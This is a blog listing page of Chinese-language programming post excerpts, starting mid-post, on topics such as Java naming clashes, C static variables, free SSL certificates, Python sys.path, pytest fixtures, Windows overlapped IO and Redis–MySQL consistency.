2.原因:我声明的LinkedList和要使用的容器类 LinkedList&lt;&gt;() 引起歧义; 3.解决方案: 方法1:导入包(不能解决我的问题) 搜索发现有的说到导入包
import java.util.LinkedList; 发现我这里是已经导入了的(不能解决我的问题)
方法2:改类名LinkedList 为LinkedListTest 我刚刚代码中的类名是LinkedList和要用的容器类重名产生了歧义。这也是java中常常会出现的一个错误我将类名改为LinkedListTest问题解决
该类名之前：
public class LinkedList { } 该类名之后：
public class LinkedListTest { } 正常执行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b14ca11cebd252d85fb4ebe086811100/" rel="bookmark">
			百度地图搜索功能的实现--new BMap.LocalSearch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		let local = new BMap.LocalSearch(map, { renderOptions: { map: map, }, onSearchComplete: (res) =&gt; { if (local.getResults() != undefined &amp;&amp; local.getResults().Cr.length!= 0) { map.clearOverlays(); //清除标注 this.addMapMark(); //添加已存在的其他标注--（根据自己情况保留删除） } else if (local.getResults().Cr.length == 0) { this.$alert("请您精确搜索内容", { confirmButtonText: "确定", }); } else { this.$alert("未找到搜索结果", { confirmButtonText: "确定", }); } }, }); local.search(this.where); 实现效果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4211addbd5ea9b1b811d869321ecb2dc/" rel="bookmark">
			C语言中static作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1,static修饰局部变量
在局部变量之前加上关键字static，局部变量就被定义成为一个局部静态变量。
特点如下:
1）存储区：由于栈变为静态存储区rw data，生存期为整个源程序，只能在定义该变量的函数内使用。退出该函数后， 尽管该变量还继续存在，但不能使用它；当static修饰局部变量时，可以达到改变局部变量生命周期的目的
啰嗦下(用Static关键字声明后，是变量成为静态的局部变量，即编译时就为变量分配存储单元，直到程序结束时才释放。这样，使得该局部变量有记忆功能，可以记忆上次的数据，不过由于仍是局部变量，因而只能在代码块内部使用（作用域不变）
2）作用域：作用域仍为局部作用域，当定义它的函数或者语句块结束的时候，作用域随之结束。
参照代码:
代码1: //=================================== void test() { int a=1;//函数调用完之后会被销毁，所以每次打印的都是2； a++; printf("%d\n",a); } int main() { int i = 0; while (i &lt; 10) { test(); i++; } return 0; } 代码2: //=================================== void test() { static int a=1; //static改变局部变量的生命周期；变量没有被销毁时,不需要被再次定义； a++; printf("%d\n",a); } int main() { int i = 0; while (i &lt; 10) { test(); i++; } return 0; } 代码1运行结果为：
2 2 2 2 2 2 2 2 2 2 （10个2），函数调用完之后a会被销毁
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4211addbd5ea9b1b811d869321ecb2dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d0cd7752d799791aaa480ba1b3ac3ad/" rel="bookmark">
			11种免费获取SSL证书的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从2018年7月1日开始，Chrome将显示所有未使用SSL证书的网站标记为“不安全”，而拥有SSL证书的网站的权重排名都会获得提升。
随着企业与网民网络安全意识的增加，全网正在走向全面https的时代，加密将无处不在，无论是网站、APP、软件、小程序等都在大规模应用SSL进行加密。
今天介绍这些在线申请的免费 SSL 证书的网址，希望对大家有所帮助，减少你的成本开支。
一、阿里云SSL证书服务
通过阿里云SSL证书服务可以获得由Symantec（赛门铁克）提供的免费型DV SSL，为期一年。一个阿云帐户最多签发20张免费证书。支持一键将数字证书部署在阿里云已经开通的云产品中(SLB、Web应用防火墙、DDoS高防IP、CDN)，以最小成本在云上应用，统一管理，方便使用。
阿里云免费SSL证书的领取需要点小技巧，这里详细给大家介绍下：
首先打开这个网址：证书服务_SSL数字证书_HTTPS加密_服务器证书_CA认证-阿里云在搜索框输入“ssl”，点“搜索”按钮 出来搜索结果后，点“立即购买” 点“选购证书”，就会出来免费版SSL的选项了 点“DV单域名证书【免费试用】”，然后购买即可 二、百度云SSL证书服务
百度云与全球知名的第三方数字证书认证和服务机构联合推出的SSL证书申请与管理一站式服务。无需繁杂流程，一键申请，轻松实现网站与Web应用的HTTPS加密部署。SSL证书为国内证书服务商TrustAsia（亚洲诚信）联合Symantec为百度云用户专供的证书产品，市场价值1900元。DV证书属于域名验证型证书，支持线上5分钟内快速签发，免费版仅支持单域名，免费期限为1年。
网址链接：https://cloud.baidu.com/product/ssl.html
三、腾讯云SSL证书服务
腾讯云SSL证书（SSL Certificates）提供了安全套接层（SSL）证书的一站式服务，包括证书申请、管理及部署功能，与顶级的数字证书授权（CA）机构和代理商合作，为您的网站、移动应用提供 HTTPS 解决方案。通过腾讯云可以获得由Symantec（赛门铁克）提供的免费型DV SSL，为期一年。
网址链接：https://buy.cloud.tencent.com/ssl
四、华为云SSL证书管理SCM
华为云.SSL证书管理（SSL Certificate Manager）是华为联合全球知名数字证书服务机构，为您提供一站式证书的全生命周期管理，实现网站的可信身份认证与安全数据传输。通过华为云可以获得由Symantec（赛门铁克）提供的免费型DV SSL，为期一年。
网址链接：https://www.huaweicloud.com/product/scm.html
五、站长安全认证证书服务
站长工具证书服务是和全球知名的CA证书服务中心或代理商共同为用户提供的SSL证书服务产品，用户可以通过站长工具，选择需要的CA中心和其证书产品，为用户提供全站Https安全解决方案。由Symantec（赛门铁克）提供的基础级 DV SSL 证书，提供域名型免费版（DV）为期一年。
网址链接：http://aq.chinaz.com/SSL
六、CloudflareSSL证书服务
Cloudflare为小型个人网站、博客提供免费的SSL证书服务，只支持扩展支持Server Name Indication(SNI)协议的现代浏览器，这意味着它不支持IE6及之前版本、运行Android 2.2或更旧版本的Android浏览器。
网址链接：https://www.cloudflare.com/ssl
七、滴滴云SSL证书服务
滴滴云与全球顶级的CA机构合作，为用户提供安全有保障的SSL证书，使用户轻松实现网站与Web应用的HTTPS加密部署，使网站等Web应用可信，防劫持、防篡改、防监听。由Symantec（赛门铁克）提供的基础级 DV SSL 证书，提供域名型免费版（DV）为期一年。
网址链接：https://www.didiyun.com/production/cert.html
八、青云SSL证书服务
青云.SSL证书服务，灵活的DNS和HTTP验证方式 VeriSign G5根证书，完美兼容所有浏览器 主域名可同时支持www和非www 免费重新颁发完善的技术支持服务，由Symantec（赛门铁克）提供的基础级 DV SSL 证书，提供域名型免费版（DV）为期一年。
网址链接：https://www.qingcloud.com/pricing#/SSLCertificate
九、AlwaysonSSL
AlwaysonSSL是一个新的免费和自动认证机构。它由 CertCenter 和 Digicert 运行，免费提供 12 个月的 DV SSL 证书，不过目前还不支持签发 ECC 证书。申请起来非常简单，适合中小站长。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d0cd7752d799791aaa480ba1b3ac3ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54d4897dc4baa26b82ee6db40ed0c0b4/" rel="bookmark">
			【静态网页制作大作业——个人博客搭建（HTML&#43;CSS&#43;Javascript）】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 作品介绍一、作品展示二、代码实现预览地址总结 作品介绍 网页作品简介： 寒假期间学习HTML和CSS即部分Javascript后的第一个大作业，搭建一个个人静态博客，后面出于兴趣，将其部署到GitPage上并利用GitHub添加了留言功能。
一、作品展示 二、代码实现 代码如下（示例）：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;Li Shu's site&lt;/title&gt; &lt;link href="img/title.ico" rel="shortcut icon"/&gt; &lt;style type="text/css"&gt; html{ position: relative; } .top{ background-color: #FFFFFF; height: 60px; width: 1900px; position: absolute; top: 0; left: 0; } .top h1{ padding-left: 150px; font-family: "华文新魏"; } .top-left{ width: 250px; height: 50px; } .top-left span{ position: absolute; top: 15px; left: 250px; font-family: "华文新魏"; font-size: 28px; color: pink; float: left; display: none; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54d4897dc4baa26b82ee6db40ed0c0b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/534756e297f53df8bf554b4af6c1797b/" rel="bookmark">
			信息系统项目管理（三）软件工程相关知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件工程是指应用计算机科学、数学及管理科学等原理，以工程化的原则和方法来解决软件问题的工程，其目的是提高软件生成率、提高软件质量、降低软件成本。
一、需求分析 软件需求是指用户对新系统在功能、行为、性能、设计约束等方面的期望。
1.1 软件需求层次 软件的需求主要分为三个层次，从低到高依次是系统需求、用户需求和业务需求
1.1.1 系统需求 系统需求主要是从系统角度来说明软件需求，包括功能需求、非功能需求和设计约束
功能需求：规定开发人员必须在系统中实现的软件功能，满足业务需要非功能需求：系统必须具备的除功能需求外的特性，其中包括软件质量属性 性能需求：响应时间、吞吐量、资源利用率等安全性、可靠性、可维护性与易用性等等 设计约束：系统的限制条件或补充说明，如系统必须采用国产数据库系统 1.1.2 用户需求 用户需求指用户要求系统必须能完成的任务或功能
1.1.3 业务需求 业务需求是客户对相同高层次的目标要求，通过业务需求可以确定项目范围和视图，来自于项目投资人
1.2 需求分析与定义 1.2.1 质量功能部署 质量功能部署(Quality Function Deployment, QFD)是将用户要求转化成软件需求的技术，目的是最大限度的提升用户的满意度。QFD将软件需求分成三类，分别是常规需求、期望需求和意外需求
常规需求：用户认为系统应该做到的功能或性能，实现越多用户越满意期望需求：用户不能正确描述想要得到的功能需求，想当然认为系统应具备的功能或性能意外需求：用户要求范围外的功能或性能，实现这些需求用户会更高兴，但不实现也不影响其购买的决策 二、对象和类 2.1 面向对象的基本概念 对象：由数据及其操作所构成的封装体，是构成系统的基本单位类：类和对象的关系为，对象是类的实例，类是对象的模板抽象：通过特定的实例抽取共同特征以后形成概念的过程。比如对象是现实中某个实体的抽象，类是一组对象的抽象封装：将相关概念组成一个单元模块，并通过一个名称来引用它。只能通过对象对外提供的接口进行调用继承：表示类之间层次关系，这种关系使得某类对象可以继承另外一类对象的特征多态：使得在多个类可以定义同一个操作或属性名，并在每个类中可以有不同的实现接口：描述对操作规范的说明消息：体现对象间的交互，通过它向目标对象发送操作请求组件：表示软件系统中可替换的、物理的组成部分复用：指将已有的软件及其有效成分用于构造新的软件或系统。组件技术是软件复用实现的关键模式：描述了一个不断重复发生的问题，以及该问题的解决方案。包括特定环境、问题和解决方案三个组成部分。 2.2 类之间的关系 类与类之间有不同的关系，主要有这六类：
关联(Association)：关联提供了不同类对象之间的结构关系，关联系统的是对象实例之间的关系，不表示两个类之间的关系依赖(Dependency)：两个类A和B，如果B的变化可能引起A的变化，则称类A依赖于类B泛化(Generalization)：泛化描述一般事物与该事物中的特殊种类之间的关系，也就是父类与子类之间的关系。而继承关系是泛化关系的反面，可以这样说，子类继承了父类，父类是子类的泛化。聚合(Aggregation)：表示类之间的整体与部分的关系，部分可能同时属于多个"整体"，"部分"与"整体"的生命周期可以不相同组合(Composition)：表示类之间的整体与部分的关系，但不可分实现(Realization)：一个类或多个类可以实现一个接口，而每个类分别实现接口中的操作 三、统一建模语言UML UML(Unified Modeling Language) 是一种定义良好、易于表达、功能强大而且普遍使用的建模语言，它融入软件工程领域的新思想、新方法和新技术，作用域不限于支持面向对象分析（Object-Oriented Analysis，OOA）和面向对象设计（Object-Oriented Design，OOD）,支持从需求分析开始的软件开发全过程。
UML 独立于软件开发过程，它不是程序设计语言，是一种可视化的建模语言。
3.1 UML中的关系 UML 用关系把事物结合在一起，主要有以下四种关系（也就是类与类之间的6种关系）：
依赖（dependency）：两个事物之间的语义关系，其中一个事物发生变化会影响另一个事物的语义
关联（association）：描述一组对象之间连接的结构关系
聚合(Aggregation)：两个对象是整体与部分，可以分割组合(Composition)：两个对象是整体与部分，但是无法分割 泛化（generalization）：一般化和特殊化的关系，描述特殊元素的对象可替换一般元素的对象
实现（Realization）：一个类或多个类实现一个接口，其中的每个类分别实现接口的操作
3.2 UML视图 UML 由视图(View)、图(Diagram)、模型元素(Model Element)和通用机制(General Mechanism)等几个部分组成：
视图：是表达系统的某一方面的特征的UML建模元素的子集，由多个图组成，是在某个抽象层上对系统的抽象表示图：是模型元素集的图形表示，通常是由弧(关系)和顶点(其他模型元素)相互连接构成的模型元素：代表面向对象中的类、对象、消息和关系等概念，是构成图的最基本的常用概念通用机制：用于表示其他信息，比如注释、模型元素的语义等。 而视图则是从不同视角为系统构架建模，形成系统的不同视图，主要有这样五类视图：
用例视图（Use Case View）：强调从用户角度看到的或需要的系统功能，是被称为参与者的外部用户所能观察到的系统功能的模型图逻辑视图（Logical View）：展现系统的静态或结构组成及特征，也叫做结构模型视图或静态视图并发视图（Concurrent View）：体现系统的动态或行为特征，也叫做模型视图或动态视图组件视图（Component View）：体现系统实现的结构和行为特征，也叫做实现模型视图部署视图（Deployment View）：体现系统实现环境的结构和行为特征，也叫做物理视图或环境模型视图 视图主要有图类组成，下面来看看具体的UML图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/534756e297f53df8bf554b4af6c1797b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28ddc6b11cb3cb87eb5b19afde7311f8/" rel="bookmark">
			windows TCP/IP 网络编程（五）5种windows网络模型(4) 重叠IO模型(a)事件通知
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文思维导图
1 重叠IO介绍 重叠IO两种反馈方式： ①事件通知 ②完成例程
2 重叠IO逻辑 和 性能 3 事件通知实现逻辑 4 创建socket 5 重叠IO 5.1 投递异步接收链接请求 5.2 WSARecv 5.3 WSASend overlapped_event_server.c
#define _CRT_SECURE_NO_WARNINGS #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;Winsock2.h&gt; #include &lt;mswsock.h&gt; #include &lt;string.h&gt; #pragma comment(lib, "Ws2_32.lib") #pragma comment(lib, "Mswsock.lib") #define MAX_COUNT 1024 #define MAX_RECV_COUNT 1024 SOCKET all_socket[MAX_COUNT]; OVERLAPPED all_olp[MAX_COUNT]; int count = 0; char recv_buf[MAX_RECV_COUNT];//接收缓冲区 void Clear() { for (int i = 0; i &lt; count; i++) { closesocket(all_socket[i]); WSACloseEvent(all_olp[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28ddc6b11cb3cb87eb5b19afde7311f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3db661de6f1267ca55b9c75c43a6181b/" rel="bookmark">
			百度网盘提速小技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天浏览文章时，发现了一个提升百度网盘传输速度的小技巧，下载速度瞬间从几百k/s飙升到数M/s，具体设置过程如下：
下载时选择“设置”—“传输”—“下载提速”——“开启”。
开了这个后，可以利用闲置宽带帮你加速。
让人惊喜的速度，大家可以试试。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a199a12940669e93d85c0d43e18ba08e/" rel="bookmark">
			关于论文那些事
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 1.论文查找技巧2. 论文引用3. 论文查重4. 文献数据提取 毕业季要到了，是否有小伙伴为了论文撰写而感到发愁呢，希望本文能有所帮助。 1.论文查找技巧 谈到查找论文，首先想到的是知网、sci、万方数据、百度学术等等。在论文引用和下载时上述方法都存在一定的弊端：
知网和万方在查找中文文献时具备一定优势，但外文文献的查阅属实不敢恭维；sci主要用于查找英文文献，但并不方便引用；百度学术搜索范围广，但下载困难，引用也存在问题。 这几天偶然发现了一个窍门，小坐分享:
4. 根据标题采用百度学术查找DOI
5. 打开https://dx.doi.org/，输入DOI,就可以查询全文了，引用也很方便。换句话说，只要有了DOI,就可以利用这个网站进行查询。
2. 论文引用 很多时候我们在引用论文时，需要调整文章顺序，此时，就需要重新编辑论文编号，很麻烦。目前，
支持论文引用的软件有很多，如：NoteExpress，Endnote以及知网研学（可以直接查看文档并备注，另外两种软件需要跳转编辑）等；我用的是NoteExpress整理文档，可直接生成相应的题录，很方便。如果小伙伴有更好的方法，可以和我沟通交流哈，助力我成长。
3. 论文查重 我用的是paperyy，每天一次免费查重，然后中午11：11到11：22至尊版限时免费，但貌似只限五次。之后，就需要换一个帐号了。
4. 文献数据提取 在科技论文写作过程中，需要将自己的数据和前人成果进行对比。为了从别人的论文中得到原始数据，往往需要从曲线图中自主提取数据，这里介绍一下两种好用的图片数据提取工具：
GetData Graph DigitizerWebPlotDigitizer 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ace3f9ba89b391687d4e7ce25129954/" rel="bookmark">
			关于python import的sys.path路径问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于python import的sys.path路径问题 sys.path 先说一下 sys.path 这个变量，该变量需要导入 sys 官方库方可使用，它是一个列表，是当前 python 文件 import 库时会逐个搜索列表中的路径。
初始化 sys.path 从这些位置初始化：
包含输入脚本的目录（或当前目录，当没有指定文件时）PYTHONPATH（目录名列表，与 shell 变量 PATH 语法相同）与安装相关的默认值（比如当前conda环境的路径） 添加 为了解决上述问题，需要添加模块搜索路径，可以使用以下几种方式：
动态增加路径
临时生效，对于不经常使用的模块，这通常是最好的方式，因为不必用所有次要模块的路径来污染 PYTHONPATH。
import sys sys.path.append('/home/song/mylib') 修改 PYTHONPATH 变量
永久生效，对于在许多程序中都使用的模块，可以采用这种方式。这将改变所有 Python 应用的搜索路径，因为启动 Python 时，它会读取这个变量，甚至不同版本的 Python 都会受影响。
export PYTHONPATH=$PYTHONPATH:/home/song/mylib 直接命令行执行则当前终端生效，或添加到 ~/.bashrc 中并 source 永久生效。
增加 .pth 文件
永久生效，这是最简单的、也是推荐的方式。Python 在遍历已知的库文件目录过程中，如果遇到 .pth 文件，便会将其中的路径加入到 sys.path 中，于是 .pth 中所指定的路径就可以被 Python 运行环境找到了。
在 /usr/local/lib/python3.5/site-packages 下添加一个扩展名为 .pth 的配置文件（例如：extras.pth），内容为要添加的路径：/home/song/mylib 。
例子 考虑这样一个目录结构，他基本涵盖我们 python 文件 import 自定义库时的情况：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ace3f9ba89b391687d4e7ce25129954/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e220abd97721871b1c8828cfd4e2665/" rel="bookmark">
			记录一下KEIL编译器的优化等级及说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1,先看一下官方文档(此资料为翻译后的)
Optimization level -O0
Optimization level -O1
Optimization level -O2
Optimization level -O3
以上可以看出 官方推荐的优化等级是01 可以大幅度提高代码运行的效率,压缩代码大小
而优化等级2和3 则会得到更高效的运行效率, 但也要求我们写的代码更加严谨才可以,不然压缩优化后的代码如果写得不严谨, 是很容易出现问题的.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/956203927e577a2f9a8668ab6b21508e/" rel="bookmark">
			python笔记-字符串与字节数组类(bytes)之间的转换关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 @toc
背景 将密钥与数据等信息通过字符串进行传输时,需要使用到字符串与字节数组类bytes间的转换
转换案例 字符串转字符编码bytes str = "hello" #转ascii编码bytes b = str.encode("ascii") #转utf-8编码bytes c = str.encode("utf-8") 十六进制的字符串转(字面上的内容值)bytes #例子 str = "ffa7c2" #str转换成bytes得到b b = b'\xff\xa7\xc2' import binascii str = "ffa7c2" b = binascii.a2b_hex(str) 十六进制的bytes数据转字符串显示 #例子 b = b'\x01\x02\x03' str = "010203" import struct import binascii b = struct.pack("B", 1) b += struct.pack("B", 2) b += struct.pack("B", 3) # 经过一轮组装后 b = b'\x01\x02\x03' str = binascii.b2a_hex(b).decode("utf-8") 注意点 len(...)函数操作str不包含'\0'字符的长度 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cde388d1eca22a83f6afbed28b0b2224/" rel="bookmark">
			【pytest-fixture】六、fixture通过yield或addfinalizer完成拆卸/清理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我基本上是跟着官网去学习fixture，自己先看并学了一遍，为了方便后续查看和记忆，所以将学习笔记记录下来，如果有不对的地方，欢迎大家评论区指出。
目录 1.yield方式完成清理（推荐）1.1介绍1.2代码示例1.3运行结果1.4结果分析1.5举例说明多个yield的fixture执行顺序1.6对于yield出错后的执行方式说明 2.使用addfinalizer方法完成清理2.1介绍2.2实例代码2.3运行结果2.4结果分析 3.两种方式适用的场景 当我们运行我们的测试时，我们会希望确保它们自己清理干净，这样它们就不会与任何其他测试混淆（同时我们也不会留下大量的测试数据来使系统膨胀）。pytest 中的 Fixtures 提供了一个非常有用的拆卸系统，它允许我们定义每个 Fixture 自行清理所需的特定步骤。分别是通过yield或addfinalizer完成清理，下面分别对这两种方式进行展开说明。
1.yield方式完成清理（推荐） 1.1介绍 使用yield的fixture和普通的fixture基本差不多，但还是有以下两点：
return改换成yield。需要做清理的代码写在yield的下面。 使用yield后，fixture的执行顺序是这样的，如有两个fixture函数，fixture1和fixture2，先由pytest计算出fixture的线性顺序，它将运行每个fxiture直到它返回，然后移动到列表中的下一个夹具做同样的事情。等待测试完成后，pytest将返回到fxiture列表，但顺序相反，如果开始先执行了fixture1再执行了fixture2，那么后面就是先执行fixture2在执行fixture1.
1.2代码示例 文件名：test_demo.py
import pytest @pytest.fixture def get_token(): print("请求获取token") yield # 这里写你的清理代码 print("注销token") def test_demo(): print("测试用例") 1.3运行结果 1.4结果分析 通过结果展示，我们可以清楚的看到我们的清理代码在测试用例运行过后运行了。这种方式比我们用setup和teardown要好很多，可以抽取公共代码，减少代码冗余。
1.5举例说明多个yield的fixture执行顺序 示例代码
文件名: test_demo.py import pytest @pytest.fixture def fn1(): print("我是fn1，我在yield前面") yield 1 print("我是fn1，我在yield后面") @pytest.fixture def fn2(fn1): print("我是fn2，我在yield前面") yield 2 print("我是fn2，我在yield后面") def test_demo(fn2): print("我是测试用例") 运行结果
结果分析 通过上述例子，我们可以很明显知道yield的fixture的执行顺序
pytest先计算出线性顺序，先执行了fn1，然后再执行了fn2，再执行test，清理时就先执行的fn2，然后再执行fn1，与开始的顺序相反。
1.6对于yield出错后的执行方式说明 还是通过代码和运行的方式进行说明
实例代码
文件名: test_demo.py import pytest @pytest.fixture def fn1(): print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cde388d1eca22a83f6afbed28b0b2224/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57b6a2d6c5f020e238e8e97ce2a095f8/" rel="bookmark">
			便携心电信号传输设备PCB
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、系统结构 二、绘制过程（此PCB项目基于AD20绘制） V1版本： V2版本 V3版本 V4版本 总结 在饶文贵老师的指导下，在V1-V4版的不断修改改进中，我学到了：
画板前首先要先布局好，要注意器件的摆放是否合理，是否好走线，经量避免交叉线。如晶振此类时钟信号线，不论频率高低与否都要进行差分布线处理，要使走线等长，差分走完线后可进行包地处理，避免其他信号线的噪声干扰，确保时钟信号的鲁棒性强。走线要避免与焊盘距离过近，否则漏焊后会有影响。设置过孔时，要注意两个过孔之间应具有合适的距离，原因同上。过孔处的两条信号线应尽量呈钝角，避免呈锐角，会有噪声产生，影响信号传输。要设置驻孔。走线之间距离不能太近。 饶老师说过：“电流就像水流一样。”所以在画板时应将电流想象成水流，来考虑怎样的布线会对电路有怎样的影响。
饶老师告诉我， 美观的板子才是好板子，对比4个版本，确实可以发现，板子逐步变得简洁，美观，大方。
感谢饶老师给予的指导，每次进办公室都学到了很多东西（nico）
（版本还在更新，板子仍需完善）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fee18d53ac47f010c0628a79b340c89/" rel="bookmark">
			Mac环境安装Win虚拟机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景： 工作环境是MacOS, 绝大多数场景都满足开发要求。
在有些特殊的场景下，比如第三方工具限制、Android手机刷机等，需要Win环境支持。
1.下载WMFusion 2.安装虚拟机 2.1下载Win系统 可以从这里找到合适的Win镜像：Win系统下载
我是用的Win镜像是这个版本
2.2安装镜像 步骤1:将镜像文件拖拽至箭头处 步骤2:点击继续 步骤3:输入密码、密钥、选择Win版本 步骤4:选择集成方式（我选择了更加独立） 两种方式均可，视个人情况而定
更加无缝：Win系统可以直接访问到Mac中的文件；
更加独立：Win系统无法直接访问Mac中的文件，需要将Mac中文件复制/拖拽到Win中。
步骤5:点击完成，开始自动安装系统。 3.安装完成 Win10正常展示
连上Android设备，提示是接到Mac还是Win
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f145c2302588f9d6ec8734f9986851ac/" rel="bookmark">
			【每天学一点-02】 使用Html5&#43;Less实现简单的静态管理员登录界面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、首先引用Less
有npm安装、cdn引用、或者下载Less.js本地引用，我采用的是第三种方法
less.js引用：
下载地址：less.js/dist at master · less/less.js · GitHub
&lt;script src="./js/less.js" type="text/javascript"&gt;&lt;/script&gt; cdn引用：
&lt;script src="//cdnjs.cloudflare.com/ajax/libs/less.js/2.5.3/less.min.js"&gt;&lt;/script&gt; login.less引用（该文件代码贴下面啦）：
&lt;link rel="stylesheet/less" type="text/css" href="css/login.less"&gt; 2、Html布局-index.html
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;管理员登录&lt;/title&gt; &lt;!--login.less文件引入--&gt; &lt;link rel="stylesheet/less" type="text/css" href="css/login.less"&gt; &lt;/head&gt; &lt;body&gt; &lt;!--登录表单父级盒子--开始--&gt; &lt;div class="form-container"&gt; &lt;!--登录表单--开始--&gt; &lt;form class="form-main"&gt; &lt;!--表单名--&gt; &lt;div class="form-item form-title"&gt; 管理员登录 &lt;/div&gt; &lt;!--表单组件--&gt; &lt;div class="form-item"&gt; &lt;!--用户名输入框--&gt; &lt;input type="text" name="username" id="username" class="form-input" placeholder="用户名"&gt; &lt;/div&gt; &lt;div class="form-item"&gt; &lt;!--用户名密码输入框--&gt; &lt;input type="password" name="password" id="password" class="form-input" placeholder="用户名密码"&gt; &lt;/div&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f145c2302588f9d6ec8734f9986851ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5ceb3c19bfd99d35b592d77f798b1ab/" rel="bookmark">
			redis和mysql如何保持数据一致性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis和mysql如何保持数据一致性 一般情况下，redis是实现 应用和数据库之间的一个读操作的缓存层。 目的就是减少数据库的IO，提高数据库的IO性能
数据-&gt;写入缓存，读取数据，首先尝试，命中缓存就从缓存中读取数据，没有命中就去数据库中读取
查到后再把数据写到缓存。出现的问题，一份数据同时保存在redis和数据库中，当数据发声变化时，需要更新 redis和数据库，因为更新操作是有先后顺序的，不像mysql中的多表事务操作，可以满足ACID的特性
此时就会出现数据一致性的问题。
解决方法： .先更新数据库，再更新缓存(缓存更新失败就会导致数据不一致) .先删除缓存，再更新数据库,再更新缓存。理论上是一致的， 但是比极端情况下，删除缓存和更新数据库不是原子操作,在过程中 有线程访问，还是会有数据库不一致的问题 采用最终一致性的一个方案： 1. 基于RocketMQ 的可靠性消息通信来实现数据的最终一致性
2. 直接通过Cannal组件，监控mysql中的binlog的日志，把更新后的数据同步到redis
3. redis和mysql之间还有一种中间件可以同步数据，redismq
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a05e788bafedd9a051b234d948b1d674/" rel="bookmark">
			java常用垃圾回收器G1和CMS的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 概述 从jdk1.8为界限，几种常用的垃圾回收器如下图所示：
注意：
对于Serial-Serial Old 和Parallel Scavenge-Parallel Old这两种垃圾回收器，新生代都采用复制回收算法，老年代采用标记整理算法，区别在于回收时采用一个还是多个线程，缺点也都很一致，就是会产生STW。
虽然CMS垃圾回收器比其他两种好，但是java8之前还算是默认使用的是PS-PO回收器。
2 ParNew-CMS（ConcurrentMarkSweep）回收器 与上图说的那样，parNew是一种新生代垃圾回收器，而CMS是一种老年代垃圾回收器，两者常作为搭档应用。
从他的名字ConcurrentMarkSweep我们就可以顾名思义，它是一种“并发标记清除算法”，新生代采用复制算法，老年代采用标记清除算法。
注意：
上面其他两种Serial Old和Parallel Old采用的是标记整理算法。
而标记清除算法是会产生内存碎片的，CMS怎么解决的呢？
解决这个问题的办法就是可以让CMS在进行一定次数的Full GC（标记清除）的时候进行一次标记整理算法，CMS提供了一下参数来控制：
-XX：UseCMSCompactAtFullCollection -XX:CMSFullGCBeforeCompaction=5
